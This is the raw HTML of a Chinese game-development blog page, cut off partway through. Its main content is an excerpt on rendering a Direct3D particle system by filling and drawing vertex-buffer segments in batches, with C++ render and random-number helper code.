<!doctype html><html lang=zh-CN data-theme=dark><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=theme-color content="#222" media="(prefers-color-scheme: dark)"><meta name=generator content="Hugo 0.157.0"><link rel="shortcut icon" type=image/x-icon href=/imgs/icons/favicon.ico><link rel=icon type=image/x-icon href=/imgs/icons/favicon.ico><link rel=icon type=image/png sizes=16x16 href=/imgs/icons/favicon_32_32_next.png><link rel=icon type=image/png sizes=32x32 href=/imgs/icons/favicon_128_128_next.png><link rel=apple-touch-icon sizes=180x180 href=/imgs/icons/apple_touch_icon_next.png><meta itemprop=name content="Posts"><meta itemprop=description content="福兮祸兮，焉知所依？冬去冰泮，春来萌荣。朝生暮死，亦可惊鸿。知足者富，自足者强。"><meta name=description content="福兮祸兮，焉知所依？冬去冰泮，春来萌荣。朝生暮死，亦可惊鸿。知足者富，自足者强。"><meta itemprop=image content="https://blogs.qipai360.cn/imgs/avatar.jpg"><meta itemprop=keywords content="Rise,ZhangTuohui,技术,C++,Unity3D,Lua,NodeJS,C#,JavaScript,游戏开发,机器学习,深度学习,AI,编程,编程语言,编程技术,编程开发,游戏引擎,游戏设计,游戏制作,游戏开发者,游戏开发者博客,游戏开发者网站,游戏开发者工具,游戏开发者教程,游戏开发者学习,游戏开发者交流,游戏开发者分享,游戏开发者经验,游戏开发者心得,游戏开发者技巧,游戏开发者方法,游戏开发者思路,游戏开发者理念,游戏开发者文化,游戏开发者精神,游戏开发者信仰"><meta property="og:type" content="website"><meta property="og:title" content="Posts"><meta property="og:description" content="福兮祸兮，焉知所依？冬去冰泮，春来萌荣。朝生暮死，亦可惊鸿。知足者富，自足者强。"><meta property="og:image" content="/imgs/avatar.jpg"><meta property="og:image:width" content="312"><meta property="og:image:height" content="312"><meta property="og:image:type" content="image/jpeg/png/svg/jpg"><meta property="og:url" content="https://blogs.qipai360.cn/post/"><meta property="og:site_name" content="Rise的自留地"><meta property="og:locale" content="zh-CN"><link type=text/css rel=stylesheet href=https://blogs.qipai360.cn/js/3rd/font-awesome/6.7.2/css/all.min.css><link type=text/css rel=stylesheet href=https://blogs.qipai360.cn/js/3rd/animate.css/3.1.1/animate.min.css><link type=text/css rel=stylesheet href=https://blogs.qipai360.cn/js/3rd/viewerjs/1.11.6/viewer.min.css><link rel=stylesheet href="/css/main.min.css?=1772265587"><style type=text/css>.post-footer hr:after{content:"~ 我可是有底线的哟 ~"}.flinks-list-footer hr:after{content:"~ 我可是有底线的哟 ~"}</style><script type=text/javascript>(function(){localDB={set:function(e,t,n){if(n===0)return;const s=new Date,o=n*864e5,i={value:t,expiry:s.getTime()+o};localStorage.setItem(e,JSON.stringify(i))},get:function(e){const t=localStorage.getItem(e);if(!t)return 0[0];const n=JSON.parse(t),s=new Date;return s.getTime()>n.expiry?(localStorage.removeItem(e),0[0]):n.value}},theme={active:function(){const e=localDB.get("theme");if(e==null)return;theme.toggle(e),window.matchMedia("(prefers-color-scheme: dark)").addListener(function(e){theme.toggle(e.matches?"dark":"light")})},toggle:function(e){document.documentElement.setAttribute("data-theme",e),localDB.set("theme",e,2);const t=document.querySelector("iframe.giscus-frame");if(t){const n={setConfig:{theme:e}};t.contentWindow.postMessage({giscus:n},"https://giscus.app")}}},theme.active()})(window)</script><script type=text/javascript>document.addEventListener("DOMContentLoaded",()=>{var e=document.createElement("script");e.charset="UTF-8",e.src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js",e.async=!1,e.defer=!0,document.head.appendChild(e),e.onload=function(){NexT.utils.fmtBusuanzi()}})</script><script defer src=https://static.cloudflareinsights.com/beacon.min.js data-cf-beacon='{"token": "2b23669184fc49269e400525ac2447d9"}'></script><title>post - Rise的自留地</title><noscript><link rel=stylesheet href=/css/noscript.css></noscript></head><body itemscope itemtype=http://schema.org/WebPage class=use-motion><div class=headband></div><main class=main><header class=header itemscope itemtype=http://schema.org/WPHeader><div class=header-inner><div class=site-brand-container><div class=site-nav-toggle><div class=toggle aria-label role=button><span class=toggle-line></span>
<span class=toggle-line></span>
<span class=toggle-line></span></div></div><div class=site-meta><a href=/ class=brand rel=start><i class=logo-line></i><h1 class=site-title>Rise的自留地</h1><i class=logo-line></i></a><p class=site-subtitle itemprop=description>记录生活中的点滴，分享编程技术和游戏开发经验。</p></div><div class=site-nav-right><div class="toggle popup-trigger"></div></div></div><nav class=site-nav><ul class="main-menu menu"><li class="menu-item menu-item-home"><a href=/ class=hvr-icon-pulse rel=section><i class="fa fa-home hvr-icon"></i>首页</a></li><li class="menu-item menu-item-about"><a href=/about.html class=hvr-icon-pulse rel=section><i class="fa fa-user hvr-icon"></i>关于</a></li><li class="menu-item menu-item-archives"><a href=/archives/ class=hvr-icon-pulse rel=section><i class="fa fa-archive hvr-icon"></i>归档
<span class=badge>679</span></a></li><li class="menu-item menu-item-tags"><a href=/tags/ class=hvr-icon-pulse rel=section><i class="fa fa-tags hvr-icon"></i>标签</a></li><li class="menu-item menu-item-message"><a href=/message/ class=hvr-icon-pulse rel=section><i class="fa fa-comments hvr-icon"></i>留言板</a></li><li class="menu-item menu-item-commonweal"><a href=/404.html class=hvr-icon-pulse rel=section><i class="fa fa-heartbeat hvr-icon"></i>公益 404</a></li></ul></nav></div><div class="toggle sidebar-toggle" role=button><span class=toggle-line></span>
<span class=toggle-line></span>
<span class=toggle-line></span></div><aside class=sidebar><div class="sidebar-inner sidebar-overview-active"><ul class=sidebar-nav><li class=sidebar-nav-toc>文章目录</li><li class=sidebar-nav-overview>站点概览</li></ul><div class=sidebar-panel-container><div class="post-toc-wrap sidebar-panel"><div class="post-toc animated"><nav id=TableOfContents></nav></div></div><div class="site-overview-wrap sidebar-panel"><div class="site-author site-overview-item animated" itemprop=author itemscope itemtype=http://schema.org/Person><img class=site-author-image itemprop=image alt=Rise src=/imgs/img-lazy-loading.gif data-src=/imgs/avatar.jpg><p class=site-author-name itemprop=name>Rise</p><div class=site-description itemprop=description>福兮祸兮，焉知所依？冬去冰泮，春来萌荣。朝生暮死，亦可惊鸿。知足者富，自足者强。</div></div><div class="site-state-wrap site-overview-item animated"><nav class=site-state><div class="site-state-item site-state-posts"><a href=/archives/><span class=site-state-item-count>679</span>
<span class=site-state-item-name>日志</span></a></div><div class="site-state-item site-state-categories"><a href=/categories/><span class=site-state-item-count>35</span>
<span class=site-state-item-name>分类</span></a></div><div class="site-state-item site-state-tags"><a href=/tags/><span class=site-state-item-count>118</span>
<span class=site-state-item-name>标签</span></a></div></nav></div><div class="links-of-social site-overview-item animated"><span class=links-of-social-item><a href=https://github.com/rise-worlds title="Github → https://github.com/rise-worlds" rel=noopener class=hvr-icon-pulse target=_blank><i class="fab fa-github fa-fw hvr-icon"></i>
Github
</a></span><span class=links-of-social-item><a href=mailto:rise.worlds@outlook.com title="E-Mail → mailto:rise.worlds@outlook.com" rel=noopener class=hvr-icon-pulse target=_blank><i class="fa fa-envelope fa-fw hvr-icon"></i>
E-Mail
</a></span><span class=links-of-social-item><a href=https://www.zhihu.com/people/rise-worlds title="知乎 → https://www.zhihu.com/people/rise-worlds" rel=noopener class=hvr-icon-pulse target=_blank><i class="fa fa-book fa-fw hvr-icon"></i>
知乎
</a></span><span class=links-of-social-item><a href=https://twitter.com/riseworlds title="Twitter → https://twitter.com/riseworlds" rel=noopener class=hvr-icon-pulse target=_blank><i class="fab fa-twitter fa-fw hvr-icon"></i>
Twitter
</a></span><span class=links-of-social-item><a href=https://www.facebook.com/rise.worlds title="facebook → https://www.facebook.com/rise.worlds" rel=noopener class=hvr-icon-pulse target=_blank><i class="fab fa-facebook fa-fw hvr-icon"></i>
facebook
</a></span><span class=links-of-social-item><a href=https://youtube.com/@YiXuan title="YouTube → https://youtube.com/@YiXuan" rel=noopener class=hvr-icon-pulse target=_blank><i class="fab fa-youtube fa-fw hvr-icon"></i>
YouTube
</a></span><span class=links-of-social-item><a href=https://instagram.com/rise.worlds title="Instagram → https://instagram.com/rise.worlds" rel=noopener class=hvr-icon-pulse target=_blank><i class="fab fa-instagram fa-fw hvr-icon"></i>
Instagram
</a></span><span class=links-of-social-item><a href=https://t.me/riseworlds title="Telegram → https://t.me/riseworlds" rel=noopener class=hvr-icon-pulse target=_blank><i class="fab fa-telegram fa-fw hvr-icon"></i>
Telegram</a></span></div><div class="links-of-blogroll site-overview-item animated"><div class=links-of-blogroll-title><i class="fa fa-globe fa-fw"></i>
友情链接</div><ul class=links-of-blogroll-list><li class=links-of-blogroll-item><a href=https://www.qipai360.cn title=https://www.qipai360.cn target=_blank>Qipai360</a></li><li class=links-of-blogroll-item><a href=https://www.cnblogs.com/flying_bat title=https://www.cnblogs.com/flying_bat target=_blank>博客园</a></li><li class=links-of-blogroll-item><a href=https://zishu.me title=https://zishu.me target=_blank>子舒的博客</a></li><li class=links-of-blogroll-item><a href=https://gitee.com/hugo-next/hugo-theme-next title=https://gitee.com/hugo-next/hugo-theme-next target=_blank>Hugo-NexT</a></li></ul></div></div></div></div><div id=siteinfo-card-widget class=sidebar-card-widget><div class=item-headline><i class="fas fa-chart-line"></i>
<span>网站资讯</span></div><div class=siteinfo><div class=siteinfo-item><div class=item-name><i class="fa-solid fa-calendar-check"></i>已运行：</div><div class=item-count id=runTimes data-publishdate="2004-10-06 15:24:00 +0800 +0800"></div></div><div class=siteinfo-item><div class=item-name><i class="fas fa fa-user"></i>总访客数：</div><div class=item-count id=busuanzi_value_site_uv><i class="fa fa-sync fa-spin"></i></div></div><div class=siteinfo-item><div class=item-name><i class="fas fa fa-eye"></i>页面浏览：</div><div class=item-count id=busuanzi_value_site_pv><i class="fa fa-sync fa-spin"></i></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-font"></i>总字数：</div><div class=item-count id=wordsCount data-count=2423147></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-mug-hot"></i>阅读约：</div><div class=item-count id=readTimes data-times=5207></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-clock-rotate-left"></i>最后更新于：</div><div class=item-count id=last-push-date data-lastpushdate="2026-02-28 15:59:00 +0800 +0800"></div></div></div></div></aside><div class=sidebar-dimmer></div></header><div class=tool-buttons><div id=goto-comments class="button goto-comments" title=直达评论><i class="fas fa-comments"></i></div><div id=toggle-theme class=button title=深浅模式切换><i class="fas fa-adjust"></i></div><div class=back-to-top role=button title=返回顶部><i class="fa fa-arrow-up"></i>
<span>0%</span></div></div><div class=reading-progress-bar></div><a role=button class="book-mark-link book-mark-link-fixed"></a><a href=https://github.com/rise-worlds rel="noopener external nofollow noreferrer" target=_blank title="Follow me on GitHub" class="exturl github-corner"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0 0 115 115h15l12 27L250 250V0z"/><path d="M128.3 109C113.8 99.7 119 89.6 119 89.6 122 82.7 120.5 78.6 120.5 78.6 119.2 72 123.4 76.3 123.4 76.3 127.3 80.9 125.5 87.3 125.5 87.3 122.9 97.6 130.6 101.9 134.4 103.2" fill="currentColor" style="transform-origin:130px 106px" class="octo-arm"/><path d="M115 115C114.9 115.1 118.7 116.5 119.8 115.4l13.9-13.8C136.9 99.2 139.9 98.4 142.2 98.6 133.8 88 127.5 74.4 143.8 58 148.5 53.4 154 51.2 159.7 51 160.3 49.4 163.2 43.6 171.4 40.1 171.4 40.1 176.1 42.5 178.8 56.2 183.1 58.6 187.2 61.8 190.9 65.4 194.5 69 197.7 73.2 200.1 77.6 213.8 80.2 216.3 84.9 216.3 84.9 212.7 93.1 206.9 96 205.4 96.6 205.1 102.4 203 107.8 198.3 112.5 181.9 128.9 168.3 122.5 157.7 114.1 157.9 116.9 156.7 120.9 152.7 124.9L141 136.5C139.8 137.7 141.6 141.9 141.8 141.8z" fill="currentColor" class="octo-body"/></svg></a><noscript><div class=noscript-warning>Theme NexT works best with JavaScript enabled</div></noscript><div class="main-inner index posts-expand"><div class=post-block><article itemscope itemtype=http://schema.org/Article class=post-content lang><link itemprop=mainEntityOfPage href=https://blogs.qipai360.cn/post/d3d-particle-system-3/><span hidden itemprop=author itemscope itemtype=http://schema.org/Person><meta itemprop=image content="/imgs/avatar.jpg"><meta itemprop=name content="Rise"></span><span hidden itemprop=publisher itemscope itemtype=http://schema.org/Organization><meta itemprop=name content="Rise"><meta itemprop=description content="福兮祸兮，焉知所依？冬去冰泮，春来萌荣。朝生暮死，亦可惊鸿。知足者富，自足者强。"></span><span hidden itemprop=post itemscope itemtype=http://schema.org/CreativeWork><meta itemprop=name content="D3D中的粒子系统（3）"><meta itemprop=description content="14.2.1 绘制粒子系统  因为粒子系统是动态的，在每一个帧中我们需要更新系统中的粒子，对于渲染粒子系统的一种直观但效率低下的方法如下:  创建一个足够大的顶点缓存保存最大数量的粒子。  每一帧里执行：  A.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 更新所有粒子。  B.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; COPY所有活着的粒子到顶点缓存。  C.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 绘制顶点缓存。  这个方法正确，不过不是最有效率的。第一，顶点缓冲必须足够大以保存系统中所有粒子。但是非常重要的是，当我们从列表拷贝所有粒子到顶点缓冲（步骤B）时，显卡却什么也不做。举个例子，假设我们系统有10,000个粒子，首先我们需要一个能容纳10,000个粒子的顶点缓冲，这是一个很大的内存。另外显卡将停着什么也不做直到列表中的10,000个粒子拷到顶点缓冲，直到我们调用DrawPrimitive。这个特定情况是CPU与显卡不同时工作的一个很好的例子。  更好的办法（SDK中点精灵例程中用到的方法）就象这样：  提示：这是一个简单的描述，但它说明了这一思想。它假定我们总是有500个粒子以填充一个缓存片段，但是这是不可能发生的，因为我们经常杀死并创建粒子，所以从一帧到另一帧粒子数量是变化的。举个例子，假设我们只剩下200个粒子要在当前帧拷贝并渲染。因为200个粒子不能填充整个缓存片段，我们用代码处理这个特定情形。这个特定情形只有在最后的缓存片段中才会出现，因为如果不是最后的片断，就意味着必然有500个粒子将被移到下一缓存片段。  创建一个合适尺寸的顶点缓存（能够保存2000个粒子），然后我们划分顶点缓存为几个小的块，就像这个例子，我们设置每个缓存片断的尺寸为500个粒子。  l然后创建一个全局变量 i = 0 ，用来记录片段。  每一帧里执行:  A.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 更新所有粒子。  B.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 直到所有粒子渲染完毕。  1.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 如果顶点缓存没有满：  a&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 用D3DLOCK_NOOVERWRITE标记锁定缓存片段i  b&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; COPY 500个粒子到片段i  2.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 如果顶点缓存满了：  a&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 从起始的地方开始顶点缓冲: i=0  b&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 用D3DLOCK_NOOVERWRITE标记锁定缓存段i  c&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; COPY 500个粒子到片段i  3.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 渲染片段i.  4.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 下一片段： i+ +  备注：顶点缓存是动态的， 因此我们能利用动态锁定标记D3DLOCK_NOOVERWRITE和 D3DLOCK_DISCARD。这两个标记允许我们锁定顶点缓存的某一部分。当顶点缓存中的其他部分被渲染时，它是不能渲染的。例如，假如我们正在使用D3DLOCK_NOOVERWRITE标记渲染片段0时， 当渲染片段0的时候我们能锁定并填充片段1。这样可以防止渲染的延迟。  这个方法更有效率。首先，我们减少顶点缓存的尺寸；然后， CPU与显卡在协调的工作。也就是说，当我们绘制一小批粒子时(graphics card work)，同时拷贝另一小批粒子到顶点缓存 (CPU work)。这个动作是连续执行的，直到所有的粒子都被渲染完毕，就像你了解的一样， 显卡在全部顶点缓存被填充的时候是不用处于空闲状态的。  我们现在将注意力转向这一个渲染方案的实现，为了方便使用这个粒子系统的渲染方案, 我们使用 cParticleSystem 类中的下列数据成员:  m_vb_num—在给定时间内我们的顶点缓存能够保存的粒子数量。这个值与实际的粒子系统中的粒子数无关。  m_vb_offset—这个变量是顶点缓存中的偏移，在顶点缓存里我们将用它开始COPY下一批粒子，例如，如果第一批在缓存中是0到499，偏移到第二批COPY的开始处将是500。  m_vb_batch_size—定义一批缓存中的粒子数量。  我们现在介绍渲染方法的代码：&nbsp;&nbsp;&nbsp; void cParticleSystem::render()&nbsp;&nbsp;&nbsp; {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // The render method works by filling a section of the vertex buffer with data, then we render that section.&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // While that section is rendering we lock a new section and begin to fill that section.&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // Once that sections filled we render it. This process continues until all the particles have been drawn.&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // The benifit of this method is that we keep the video card and the CPU busy.&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(m_particles.empty())&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // set render states&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pre_render();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_device->SetTexture(0, m_texture);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_device->SetFVF(PARTICLE_FVF);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_device->SetStreamSource(0, m_vertex_buffer, 0, sizeof(sParticle));&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // render batches one by one&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // start at beginning if we're at the end of the vertex buffer&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(m_vb_offset >= m_vb_num)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_vb_offset = 0;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sParticle* v;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_vertex_buffer->Lock(&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_vb_offset * sizeof(sParticle),&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_vb_batch_num * sizeof(sParticle),&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (void**)&amp;v,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_vb_offset ? D3DLOCK_NOOVERWRITE : D3DLOCK_DISCARD);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DWORD num_particles_in_batch = 0;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // until all particles have been rendered&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for(list<sParticleAttribute>::iterator iter = m_particles.begin(); iter != m_particles.end(); iter++)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(! iter->is_alive)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; continue;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // copy a batch of the living particles to the next vertex buffer segment&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; v->position = iter->position;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; v->color&nbsp;&nbsp;&nbsp; = (D3DCOLOR) iter->color;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; v++;&nbsp;&nbsp;&nbsp; // next element&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; num_particles_in_batch++;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // if this batch full?&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(num_particles_in_batch == m_vb_batch_num)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // draw the last batch of particles that was copied to the vertex buffer&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_vertex_buffer->Unlock();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_device->DrawPrimitive(D3DPT_POINTLIST, m_vb_offset, m_vb_batch_num);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // While that batch is drawing, start filling the next batch with particles.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // move the offset to the start of the next batch&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_vb_offset += m_vb_batch_num;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // Don't offset into memory that is outside the vb's range.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // If we're at the end, start at the beginning.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(m_vb_offset >= m_vb_num)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_vb_offset = 0;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_vertex_buffer->Lock(&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_vb_offset * sizeof(sParticle),&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_vb_batch_num * sizeof(sParticle),&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (void**)&amp;v,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_vb_offset ? D3DLOCK_NOOVERWRITE : D3DLOCK_DISCARD);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; num_particles_in_batch = 0;&nbsp;&nbsp;&nbsp; // reset for new batch&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_vertex_buffer->Unlock();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // Its possible that the LAST batch being filled never got rendered because the condition &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // (num_particles_in_batch == m_vb_batch_num) would not have been satisfied.&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // We draw the last partially filled batch now.&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(num_particles_in_batch)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_device->DrawPrimitive(D3DPT_POINTLIST, m_vb_offset, num_particles_in_batch);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_vb_offset += m_vb_batch_num;&nbsp;&nbsp;&nbsp; // next block&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; post_render();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // reset render states&nbsp;&nbsp;&nbsp; }14.2.2 随机  如果我们模拟雪花，不能让所有雪花以完全相同的方式落下。我们要让它们按相似的方式落下而不是完全相同的方式。为了使粒子系统的随机功能更简单，我们增加了下列两个函数到d3dUtility.h/cpp文件。  第一个函数在[low_bound, high_bound]区间内随机的返回一个float类型值：&nbsp;&nbsp;&nbsp; float get_random_float(float low_bound, float high_bound)&nbsp;&nbsp;&nbsp; {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(low_bound >= high_bound)&nbsp;&nbsp;&nbsp; // bad input&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return low_bound;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // get random float in [0, 1] interval&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; float f = (rand() % 10000) * 0.0001f;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // return float in [low_bound, high_bound] interval&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return f * (high_bound - low_bound) + low_bound;&nbsp;&nbsp;&nbsp; }  第二个函数在边界盒的范围内，输出一个随机的向量。 &nbsp;&nbsp;&nbsp; void get_random_vector(D3DXVECTOR3* out, D3DXVECTOR3* min, D3DXVECTOR3* max)&nbsp;&nbsp;&nbsp; {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; out->x = get_random_float(min->x, max->x);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; out->y = get_random_float(min->y, max->y);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; out->z = get_random_float(min->z, max->z);&nbsp;&nbsp;&nbsp; }"></span><header class=post-header><h2 class=post-title 